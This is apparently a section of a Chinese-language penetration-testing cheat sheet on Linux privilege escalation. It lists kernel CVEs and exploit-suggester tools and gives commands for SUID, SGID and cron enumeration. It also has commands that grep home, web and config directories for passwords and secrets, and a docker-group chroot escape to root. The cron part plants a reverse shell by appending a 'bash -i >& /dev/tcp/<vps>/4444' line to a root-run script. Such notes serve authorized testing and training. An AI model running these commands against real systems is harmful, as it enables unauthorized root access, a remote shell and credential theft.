## 六、Linux权限提升

### 6.1 内核提权
```
uname -a && cat /etc/os-release
# 常见: CVE-2021-4034(Polkit pkexec,通杀) / CVE-2021-3156(sudo Baron Samedit) /
#       CVE-2022-0847(Dirty Pipe) / CVE-2023-4911(GLIBC Looney Tunables) /
#       CVE-2024-1086(nf_tables UAF)
# 工具: linux-exploit-suggester(les.sh) / linux-smart-enumeration(lse.sh)
./les.sh
```

### 6.2 SUID/计划任务/Cron
```bash
find / -perm -4000 -type f 2>/dev/null                     # SUID(gtfobins核对)
find / -perm -2000 -type f 2>/dev/null                     # SGID
ls -alh /var/spool/cron* /etc/cron* /etc/crontab           # 可写Cron脚本→命令注入
cat /etc/cron.d/* /etc/at.allow /etc/at.deny
# 可写脚本被root执行 → 反弹shell
echo 'bash -i >& /dev/tcp/<vps>/4444 0>&1' >> /usr/local/bin/backup.sh
```

### 6.3 错误配置与明文凭证
```bash
# 可写敏感文件 / 弱权限服务配置
cat /etc/passwd | grep -v nologin                          # 可登录用户
sudo -l                                                    # 当前sudo权限
ls -la /etc/shadow /etc/sudoers                            # 弱权限
grep -rE "password|passwd|secret" /home /var/www /opt /etc/init.d 2>/dev/null
# Docker组 / 特权容器 / K8s SA(见container-security-testing技能)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh         # docker组提权
```

